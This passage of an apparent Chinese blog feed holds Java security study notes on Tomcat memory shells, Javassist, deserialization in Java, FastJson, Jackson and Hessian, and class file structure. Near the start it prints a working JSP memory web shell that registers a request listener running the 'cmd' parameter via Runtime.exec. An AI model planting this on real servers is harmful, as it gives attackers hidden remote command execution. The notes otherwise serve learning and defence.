class="hljs-keyword">Wrapper</span>到StandardContext的children当中  standardCtx.addChild(newWrapper);  // 添加ServletMapping将访问的URL和Servlet进行绑定  standardCtx.addServletMapping(&quot;/shell&quot;,&quot;jweny&quot;);%&gt;</code></pre></div><h2 id="ListenMemShell"><a href="#ListenMemShell" class="headerlink" title="ListenMemShell"></a>ListenMemShell</h2><div class="code-wrapper"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;&lt;%    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> request.getServletContext();    java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);    field.setAccessible(<span class="hljs-literal">true</span>);    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) field.get(obj);    <span class="hljs-comment">//获取ApplicationContext</span>    field = applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);    field.setAccessible(<span class="hljs-literal">true</span>);    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) field.get(applicationContext);    <span class="hljs-comment">//获取StandardContext</span>    <span class="hljs-type">ListenerDemo</span> <span class="hljs-variable">listenerdemo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ListenerDemo</span>();    <span class="hljs-comment">//创建能够执行命令的Listener</span>    standardContext.addApplicationEventListener(listenerdemo);%&gt;&lt;%!    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ListenerDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;            System.out.println(<span class="hljs-string">&quot;requestDestroyed&quot;</span>);        &#125;        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;            System.out.println(<span class="hljs-string">&quot;requestInitialized&quot;</span>);            <span class="hljs-keyword">try</span>&#123;                <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> sre.getServletRequest().getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);                Runtime.getRuntime().exec(cmd);            &#125;<span class="hljs-keyword">catch</span> (Exception e )&#123;                <span class="hljs-comment">//e.printStackTrace();</span>            &#125;        &#125;    &#125;%&gt;</code></pre></div><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.anquanke.com/post/id/214483">https://www.anquanke.com/post/id/214483</a></p><p><a href="https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA">https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javassist</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/Javassist/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/Javassist/</url>
    
    <content type="html"><![CDATA[<h1 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul><li>是什么</li></ul><p>是一个Java类库</p><ul><li>可以做什么</li></ul><p>可以修改java字节码文件，在JVM运行时加载修改的字节码</p><ul><li>什么时候用</li></ul><p>RASP</p><p>JNDI动态类加载</p><p>待补充</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240401101355357.png"> </p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>Javassist （Java 编程助手）使 Java 字节码操作变得简单。它是一个用于编辑 Java 字节码的类库；它能让 Java 程序在运行时定义一个新类，并在 JVM 加载时修改类文件。与其他类似的字节码编辑器不同，Javassist 提供了两级 API：源代码级和字节码级。如果用户使用源代码级 API，就可以在不了解 Java 字节码规范的情况下编辑类文件。整个 API 的设计只使用了 Java 语言的词汇。您甚至可以以源代码文本的形式指定插入的字节码；Javassist 会在运行中对其进行编译。另一方面，字节码级 API 允许用户像其他编辑器一样直接编辑类文件。</p><p>官网：<a href="https://www.javassist.org/">https://www.javassist.org/</a></p><p>帮助文档：<a href="https://www.javassist.org/html/index.html">https://www.javassist.org/html/index.html</a></p><p>Maven：<a href="https://mvnrepository.com/artifact/org.javassist/javassist">https://mvnrepository.com/artifact/org.javassist/javassist</a></p><p>源码级API</p><p>源码级API在javassist包下</p><h1 id="源码级API"><a href="#源码级API" class="headerlink" title="源码级API"></a>源码级API</h1><h2 id="常用类"><a href="#常用类" class="headerlink" title="常用类"></a>常用类</h2><table><thead><tr><th>类名</th><th>说明</th></tr></thead><tbody><tr><td>ClassPool</td><td>CtClass类对象的容器</td></tr><tr><td>CtClass</td><td>CtClass的实例代表一个类</td></tr><tr><td>CtConstructor</td><td>CtConstructor的实例代表一个构造器</td></tr><tr><td>CtField</td><td>CtField的实例代表一个字段</td></tr><tr><td>CtMethod</td><td>CtMethod的实例代表一个方法</td></tr><tr><td>Modifier</td><td>Modifier类提供静态方法和常量来解码类和成员访问修饰符</td></tr><tr><td>CtNewMethod</td><td>创建 CtMethod 的静态方法集合</td></tr><tr><td>CtNewConstructor</td><td>创建 CtConstructor 的静态方法集合</td></tr><tr><td>CtBehavior</td><td>该类是CtMethod和CtConstructor类的父类，是一个抽象类</td></tr></tbody></table><h2 id="常用类和方法"><a href="#常用类和方法" class="headerlink" title="常用类和方法"></a>常用类和方法</h2><h3 id="ClassPath（接口）"><a href="#ClassPath（接口）" class="headerlink" title="ClassPath（接口）"></a>ClassPath（接口）</h3><h4 id="LoaderClassPath"><a href="#LoaderClassPath" class="headerlink" title="LoaderClassPath"></a>LoaderClassPath</h4><p>从加载器中加载类</p><div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">LoaderClassPath</span><span class="hljs-params">(ClassLoader cl)</span></span></code></pre></div><h4 id="ByteArrayClassPath"><a href="#ByteArrayClassPath" class="headerlink" title="ByteArrayClassPath"></a>ByteArrayClassPath</h4><ul><li><strong>ByteArrayClassPath(String name, byte[] classfile)</strong></li></ul><div class="code-wrapper"><pre><code class="hljs avrasm">从字节数组中加载类ClassPool <span class="hljs-keyword">cp</span> = ClassPool.getDefault()<span class="hljs-comment">;</span><span class="hljs-keyword">cp</span>.insertClassPath(new ByteArrayClassPath(classname, b))<span class="hljs-comment">;</span>CtClass cc = <span class="hljs-keyword">cp</span>.get(classname)<span class="hljs-comment">;</span></code></pre></div><h3 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h3><ul><li><strong>getDefault()</strong></li></ul><p>返回默认的类池，该类池使用系统搜索路径作为类搜索路径，包括平台库，扩展库，和由<code>-classpath</code>或<code>CLASSPATH</code>环境变量指定的路径。由于该方法是一个单例工厂，因此返回的对象始终是相同的。</p><ul><li><strong>appendSystemPath()</strong></li></ul><p>给ClassPool实例对象添加系统路径</p><ul><li><strong>insertClassPath(String path) &#x2F; insertClassPath(ClassPath cp)</strong></li></ul><p>在搜索路径首列插入类路径或ClassPath对象</p><ul><li><strong>appendClassPath(String path) &#x2F; appendClassPath(ClassPath cp)</strong></li></ul><p>在搜索路径末尾插入类路径或ClassPath对象</p><ul><li><strong>makeClass(java.lang.String classname)</strong></li></ul><p>创建一个public类</p><ul><li><strong>makeClass(InputStream classfile)</strong></li></ul><p>从给定的输入流中创建一个类</p><ul><li><strong>get(java.lang.String classname)</strong></li></ul><p>根据类全限定名获取该类的CtClass对象，用于后续的使用</p><div class="code-wrapper"><pre><code class="hljs routeros">比如，代表获取获取String类的引用ClassPool<span class="hljs-built_in"> pool </span>= ClassPool.getDefault();pool.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;java.lang.String&quot;</span>)</code></pre></div><h3 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h3><ul><li><strong>addField(CtField f)</strong></li></ul><p>在CtClass对象中添加字段</p><ul><li><strong>addMethod(CtMethod m)</strong></li></ul><p>在CtClass对象中添加方法</p><ul><li><strong>addConstructor(CtConstructor c)</strong></li></ul><p>在CtClass对象中添加构造方法</p><ul><li><strong>writeFile(String directoryName)</strong></li></ul><p>将CtClass对象写入到指定的路径中</p><ul><li><strong>toClass()</strong></li></ul><p>将CtClass对象转换为<code>java.lang.Class</code>类对象</p><ul><li><strong>toBytecode()</strong></li></ul><p>将CtClass对象转换为转换为字节数组</p><ul><li><strong>getDeclaredMethod(String name, CtClass[] params)</strong></li></ul><p>获取指定的方法。参数分别为方法名，参数。</p><ul><li><strong>setName(String name)</strong></li></ul><p>设置类的名字</p><ul><li><strong>freeze()</strong></li></ul><p>将CtClass对象冻结，使其不能被修改</p><ul><li><strong>defrost()</strong></li></ul><p>将CtClass对象解冻，使其可以被修改</p><ul><li><strong>detach()</strong></li></ul><p>从ClassPool中将CtClass对象删除</p><h3 id="CtField"><a href="#CtField" class="headerlink" title="CtField"></a>CtField</h3><ul><li><strong>CtField(CtClass type, String name, CtClass declaring)</strong></li></ul><p>创建一个字段。参数分别为字段类型，字段名，关联的CtClass对象</p><ul><li><strong>setModifiers(int mod)</strong></li></ul><p>设置CtField字段的访问修饰符。mod可使用<code>Modifier</code>类中的常量来表示。</p><h3 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h3><ul><li><strong>CtMethod(CtClass returnType, String mname, CtClass[] parameters, CtClass declaring)</strong></li></ul><p>创建一个方法。参数分别为方法的返回值类型，方法名，方法的参数，方法关联的CtClass对象。</p><ul><li><strong>setModifiers(int mod)</strong></li></ul><p>设置CtField字段的访问修饰符。mod可使用<code>Modifier</code>类中的常量来表示。</p><ul><li><strong>setBody(String src)</strong></li></ul><p>设置方法体内容。其中用<code>$0</code>表示<code>this</code>，<code>$1</code>、<code>$2</code>…来表示接收参数的位置</p><h3 id="CtConstructor"><a href="#CtConstructor" class="headerlink" title="CtConstructor"></a>CtConstructor</h3><ul><li><strong>CtConstructor(CtClass[] parameters, CtClass declaring)</strong></li></ul><p>创建一个构造方法。参数分别为参数类型和关联的CtClass对象</p><ul><li><strong>setBody(String src)</strong></li></ul><p>设置方法体内容。其中用<code>$0</code>表示<code>this</code>，<code>$1</code>、<code>$2</code>…来表示接收参数的位置</p><h3 id="CtBehavior"><a href="#CtBehavior" class="headerlink" title="CtBehavior"></a>CtBehavior</h3><ul><li><strong>insertBefore(String src)</strong></li></ul><p>在方法体的前面插入代码</p><ul><li><strong>insertAfter(String src)</strong></li></ul><p>在方法体的后面插入代码</p><p>insertBefore() 和 setBody()中的语句，如果是单行语句可以直接用双引号，如果是多行语句需要用<code>&#123;&#125;</code>括起来。javassist只接受单个语句或用大括号括起来的语句块。</p><h1 id="字节码级API"><a href="#字节码级API" class="headerlink" title="字节码级API"></a>字节码级API</h1><p>TODO</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Java原生反序列化"><a href="#Java原生反序列化" class="headerlink" title="Java原生反序列化"></a>Java原生反序列化</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul><li>Serializable接口</li></ul><p>类想要序列化，必须实现Serializable接口</p><p>public class Person implements Serializable {}</p><ul><li>serialVersionUID</li></ul><p>定义：随机生成的20位长度的数据</p><p>作用：防止在序列化的对象中添加恶意代码在目标机器上执行。在反序列化对象的时候，比较序列化的对象的serialVersionUID与目标类的serialVersionUID是否一致，若不一致则无法反序列化对象。</p><p>private static final long serialVersionUID &#x3D; 1871063619743495089L;</p><p>生成serialVersionUID的方法：<a href="https://blog.csdn.net/weixin_42218169/article/details/123525504">https://blog.csdn.net/weixin_42218169/article/details/123525504</a></p><h2 id="Java原生序列化与反序列化"><a href="#Java原生序列化与反序列化" class="headerlink" title="Java原生序列化与反序列化"></a>Java原生序列化与反序列化</h2><p>主要方法</p><p>序列化</p><ol><li>ObjectOutputStream：对象输出流</li><li>FileOutputStream：文件输出流</li><li>writeObject()：序列化对象</li></ol><p>反序列化</p><ol><li>ObjectInputStream：对象输入流</li><li>FileInputStream：文件输入流</li><li>readObject()：反序列化对象</li></ol><p>操作步骤</p><p>序列化</p><ol><li>创建一个对象输出流</li><li>创建一个文件输出流</li><li>序列化对象</li><li>关闭对象输出流</li></ol><p>反序列化</p><ol><li>创建一个对象输入流</li><li>创建一个文件输入流</li><li>反序列化对象</li></ol><p>demo</p><p>Person.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.Serializable;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1871063619743495089L</span>;    String name;    <span class="hljs-type">int</span> age;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;        <span class="hljs-built_in">this</span>.name = name;        <span class="hljs-built_in">this</span>.age = age;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27; +</span><span class="hljs-string">                &quot;, age=&quot; + age +</span><span class="hljs-string">                &#x27;</span>&#125;<span class="hljs-string">&#x27;;</span><span class="hljs-string">    &#125;</span><span class="hljs-string">&#125;</span></code></pre></div><p>test.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-comment">//创建一个对象输出流</span>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;src/person.ser&quot;</span>));        <span class="hljs-comment">//将对象写入磁盘中（对象的序列化）</span>        objectOutputStream.writeObject(obj);        <span class="hljs-comment">//关闭流</span>        objectOutputStream.close();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String path)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;        <span class="hljs-comment">//创建一个对象输出流</span>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(path));        <span class="hljs-comment">//将对象写入磁盘中（对象的序列化）</span>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> objectInputStream.readObject();        <span class="hljs-keyword">return</span> object;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;        <span class="hljs-comment">//创建一个对象</span>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;caofalin&quot;</span>, <span class="hljs-number">23</span>);        <span class="hljs-comment">//序列化对象</span>        <span class="hljs-comment">//serialize(person);</span>        <span class="hljs-comment">//反序列化对象</span>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> deserialize(<span class="hljs-string">&quot;src/person.ser&quot;</span>);        System.out.println(obj);    &#125;&#125;</code></pre></div><h1 id="FastJson反序列化"><a href="#FastJson反序列化" class="headerlink" title="FastJson反序列化"></a>FastJson反序列化</h1><p>fastjson：将json字符串转换为java对象。</p><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>主要方法</p><p>JSON.toJSONString(obj)</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>主要方法</p><p>JSON.parse(string); JSON.parseObject(string); JSON.parseObject(string,类名);</p><p>三种反序列化方法的区别</p><p>1、返回的类不同</p><p>JSON.parse(string)：</p><p>返回的是一个JSONObject对象</p><p>JSON.parseObject(string)：</p><p>返回的是一个JSONObject对象</p><p>JSON.parseObject(string,类名)：</p><p>返回的是指定类的类对象</p><p>2、执行过程中调用函数不同</p><p>JSON.parse(string)：</p><p>会识别并调用目标类的特定setter方法及特定条件的getter方法</p><p>JSON.parseObject(string)：</p><p>会调用反序列化目标类的特定setter和getter方法</p><p>JSON.parseObject(string,类名)：</p><p>会识别并调用目标类的特定setter方法及特定条件的getter方法</p><h2 id="反序列化过程中方法调用"><a href="#反序列化过程中方法调用" class="headerlink" title="反序列化过程中方法调用"></a>反序列化过程中方法调用</h2><p>反序列化类时setter、getter方法符合被调用的条件</p><p>setter方法：</p><p>方法名以set开头，总长度大于4，第4个字符为大写字母</p><p>非静态方法</p><p>返回值类型为void或者当前类</p><p>参数个数为1个</p><p>getter方法：</p><p>方法名以get开头，总长度大于4，第4个字符为大写字母</p><p>非静态方法</p><p>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</p><p>无传入参数</p><p>访问修饰符为public的属性，直接进行反序列化赋值</p><p>访问修饰符为private的属性。通过调用可调用的setter方法赋值</p><h3 id="type"><a href="#type" class="headerlink" title="@type"></a>@type</h3><p>功能：可以指定反序列化成服务端上的任意类，服务器端解析这个类，提取出这个类中所有符合要求的setter和getter方法，如果字符串中的传入的属性值在服务端的类中存在，就会去调用执行该属性对应的setter、getter方法</p><h1 id="Jackson反序列化"><a href="#Jackson反序列化" class="headerlink" title="Jackson反序列化"></a>Jackson反序列化</h1><p>作用：将java对象与json或xml字符串进行互转</p><p>主要方法：ObjectMapper()</p><p>序列化：</p><p>ObjectMapper objectMapper &#x3D; new ObjectMapper(); Person person &#x3D; new Person(); String string &#x3D; objectMapper.writeValueAsString(person);</p><p>序列化的特点：</p><ol><li>JackSon在序列化时也遵循这套原则，在不使⽤注解的情况下，⾸先会判断对象中的某个属性是否包含getXxx⽅法，如果有则通过此⽅法获取属性，如果没有则判断该属性是否可访问（public），如果可访问则通过反射的⽅式取此值，反之则跳过此属性。</li></ol><p>反序列化：</p><p>objectMapper.readValue(json,Person4.class);</p><p>反序列化的特点</p><p>在序列化时会调⽤属性对应的set⽅法，而反序列化与序列化则相反，⾸先会判断属性是否存在setXX⽅法，如果存在，则会去调⽤该属性对应的setXX⽅法，反之判断是否有public权限，如果有权限则通过反射为对象属性赋值。</p><p>jackson对多态的序列化与反序列化</p><p>Jackson数据绑定可以很⽅便的将java的对象类型和json数据格式之间进⾏转换。对于有多个⼦类型的多</p><p>态集成结构的对象，Jackson在序列化的时候加⼊⼀些类型信息，可以在反序列化的时候准确的还原某个</p><p>类型的⼦类。</p><p>是Jackson⽀持这种多态的序列化与反序列化，我们只需要开启了 Default Typing 机制即可</p><p>如果开启了Default Typing，则如果序列化的对象属性中有对象，则该属性值是⼀个数组，索引为0表明该对象</p><p>所表示的类，索引1表示该对象的属性以及属性值。</p><p>序列化和反序列化，如果属性为对象，则会继续调⽤此对象的get和set⽅法为此对象属性赋值，与正常情况⼀</p><p>样，相当于⼀次递归。</p><p>当 readValue ⽅法的第⼆个参数为对象所对应的Class⽽⾮ Object.class 时，攻击需要依赖于该对象内的属性类型，我们可以通过两种⽅式进⾏攻击（都有限制）。</p><ul><li>set⽅法存在危险代码</li><li>某个属性为Object类型</li></ul><h1 id="Hession反序列化"><a href="#Hession反序列化" class="headerlink" title="Hession反序列化"></a>Hession反序列化</h1><p><a href="https://www.bbsmax.com/A/l1dyXgEx5e/">https://www.bbsmax.com/A/l1dyXgEx5e/</a></p><p><a href="https://paper.seebug.org/1131/#field">https://paper.seebug.org/1131/#field</a></p><p>Apache Dubbo支持很多协议，例如Dubbo（Dubbo Hessian2）、Hessian（包括Hessian与Hessian2，这里的Hessian2与Dubbo Hessian2不是同一个）、Rmi、Http等</p><h3 id="Dubbo支持的协议"><a href="#Dubbo支持的协议" class="headerlink" title="Dubbo支持的协议"></a>Dubbo支持的协议</h3><p><a href="https://cn.dubbo.apache.org/zh-cn/overview/mannual/java-sdk/reference-manual/protocol/overview/">https://cn.dubbo.apache.org/zh-cn/overview/mannual/java-sdk/reference-manual/protocol/overview/</a></p><p><a href="https://cn.dubbo.apache.org/zh-cn/overview/mannual/java-sdk/reference-manual/protocol/">https://cn.dubbo.apache.org/zh-cn/overview/mannual/java-sdk/reference-manual/protocol/</a></p><p>dubbo的默认序列化引擎是 hessian2</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java字节码</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/Java%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/Java%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="字节码文件"><a href="#字节码文件" class="headerlink" title="字节码文件"></a>字节码文件</h1><h2 id="字节码文件结构"><a href="#字节码文件结构" class="headerlink" title="字节码文件结构"></a>字节码文件结构</h2><p><code>.java</code>文件经Java虚拟机编译生成的<code>.class</code>文件</p><p>查看字节码文件结构命令</p><div class="code-wrapper"><pre><code class="hljs applescript">javap -v XX.<span class="hljs-built_in">class</span></code></pre></div><p><strong>类文件格式</strong></p><div class="code-wrapper"><pre><code class="hljs abnf">ClassFile &#123;    u4             magic<span class="hljs-comment">;</span>    u2             minor_version<span class="hljs-comment">;</span>    u2             major_version<span class="hljs-comment">;</span>    u2             constant_pool_count<span class="hljs-comment">;</span>    cp_info        constant_pool[constant_pool_count-<span class="hljs-number">1</span>]<span class="hljs-comment">;</span>    u2             access_flags<span class="hljs-comment">;</span>    u2             this_class<span class="hljs-comment">;</span>    u2             super_class<span class="hljs-comment">;</span>    u2             interfaces_count<span class="hljs-comment">;</span>    u2             interfaces[interfaces_count]<span class="hljs-comment">;</span>    u2             fields_count<span class="hljs-comment">;</span>    field_info     fields[fields_count]<span class="hljs-comment">;</span>    u2             methods_count<span class="hljs-comment">;</span>    method_info    methods[methods_count]<span class="hljs-comment">;</span>    u2             attributes_count<span class="hljs-comment">;</span>    attribute_info attributes[attributes_count]<span class="hljs-comment">;</span>&#125;</code></pre></div><table><thead><tr><th>字段</th><th>中文</th><th>字节数</th><th>说明</th></tr></thead><tbody><tr><td>magic</td><td>魔术头</td><td>4</td><td>class文件的标识，默认是<code>0Xcafebabe</code></td></tr><tr><td>minor_version</td><td>次版本号</td><td>2</td><td>主要版本号和次要版本号共同决定了类文件格式的版本。如果类文件具有主版本号M和次版本号M，我们将其类文件格式的版本表示为M.M。因此，类文件格式版本可以按字典顺序排列，例如，1.5＜2.0＜2.1。</td></tr><tr><td>major_version</td><td>主版本号</td><td>2</td><td>Java虚拟机支持类文件版本在最小版本和最高版本之内的类文件格式</td></tr><tr><td>constant_pool_count</td><td>常量池计数</td><td>2</td><td></td></tr><tr><td>constant_pool[]</td><td>常量池</td><td>变长</td><td>表示各种字符串常量、类和接口名称、字段名称以及 ClassFile 结构及其子结构中引用的其他常量。</td></tr><tr><td>access_flags</td><td>访问标志</td><td>2</td><td></td></tr><tr><td>this_class</td><td>本类索引</td><td>2</td><td>表示该类文件定义的类或接口。</td></tr><tr><td>super_class</td><td>父类索引</td><td>2</td><td>代表该类文件所定义类的直接超类。</td></tr><tr><td>interfaces_count</td><td>接口数量</td><td>2</td><td>表示该类或接口类型的直接超接口的数量。</td></tr><tr><td>interfaces[]</td><td>接口表</td><td>变长</td><td>代表该类或接口类型的直接超级接口，其顺序为该类型的源代码中给出的从左到右的顺序</td></tr><tr><td>fields_count</td><td>字段数量</td><td>2</td><td>表示字段表中字段信息结构的个数</td></tr><tr><td>fields[]</td><td>字段表</td><td>变长</td><td>字段表只包括本类或接口声明的字段。它不包括从超类或超接口继承的字段。</td></tr><tr><td>methods_count</td><td>方法数量</td><td>2</td><td>表示方法表中 method_info 结构的数量</td></tr><tr><td>methods[]</td><td>方法表</td><td>变长</td><td>表示该类或接口类型声明的所有方法，包括实例方法、类方法、实例初始化方法以及任何类或接口初始化方法。方法表中不包括代表从超类或超接口继承的方法的项目。</td></tr><tr><td>attributes_count</td><td>属性数量</td><td>2</td><td>表示该类属性表中的属性数</td></tr><tr><td>attributes[]</td><td>附加属性表</td><td>变长</td><td></td></tr></tbody></table><h2 id="名称表示"><a href="#名称表示" class="headerlink" title="名称表示"></a>名称表示</h2><h3 id="类和接口的名称表示"><a href="#类和接口的名称表示" class="headerlink" title="类和接口的名称表示"></a>类和接口的名称表示</h3><p>类和接口的名称与编译前后有所区别，编译前的类名使用该类的全限定命表示，而在编译后的字节码文件中，其将类权限定名的<code>.</code>替换为<code>/</code>。</p><p>例如，类Thread的编译前的全限定名称是<code>java.lang.Thread</code>。在类文件格式的使用<code>java/lang/Thread</code>来表示。</p><h3 id="不合格的名称"><a href="#不合格的名称" class="headerlink" title="不合格的名称"></a>不合格的名称</h3><p>方法、字段和局部变量的名称以非限定名称的形式存储。非限定名称不得包含任何 ASCII 字符 . ; [ &#x2F;（即句号、分号、左方括号或正斜线）。除特殊方法名称 <init> 和 <clinit> 外，方法名称还必须包含 ASCII 字符 &lt; 或 &gt;（即左角括号或右角括号）。</p><h3 id="字段描述符"><a href="#字段描述符" class="headerlink" title="字段描述符"></a>字段描述符</h3><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240326153401855.png"> </p><p>比如<code>int</code>类型字段用<code>I</code>表示、<code>Object</code>字段类型用<code>Ljava/lang/Object;</code>表示</p><h3 id="方法描述符"><a href="#方法描述符" class="headerlink" title="方法描述符"></a>方法描述符</h3><p>格式：</p><div class="code-wrapper"><pre><code class="hljs avrasm">( ParameterDescriptor* ) ReturnDescriptor<span class="hljs-symbol">ParameterDescriptor:</span> FieldType<span class="hljs-symbol">ReturnDescriptor:</span>FieldType 或 V   （V表示该方法没有返回值)</code></pre></div><p>比如<code>Object m(int i, double d, Thread t) &#123;..&#125;</code>的方法描述符为<code>(IDLjava/lang/Thread;)Ljava/lang/Object;</code></p><h3 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h3><p>签名是一个字符串，代表字段或方法的通用类型，或类声明的通用类型信息。</p><h2 id="常量池"><a href="#常量池" class="headerlink" title="常量池"></a>常量池</h2><p>常量池结构</p><div class="code-wrapper"><pre><code class="hljs abnf">cp_info &#123;    u1 tag<span class="hljs-comment">;</span>    u1 info[]<span class="hljs-comment">;   //类似</span>&#125;</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/constant-type.png"> </p><h2 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h2><p><strong>字段结构</strong></p><div class="code-wrapper"><pre><code class="hljs abnf">field_info &#123;    u2             access_flags<span class="hljs-comment">;</span>    u2             name_index<span class="hljs-comment">;</span>    u2             descriptor_index<span class="hljs-comment">;</span>    u2             attributes_count<span class="hljs-comment">;</span>    attribute_info attributes[attributes_count]<span class="hljs-comment">;</span>&#125;</code></pre></div><p><strong>字段的访问标识表</strong></p><p><img 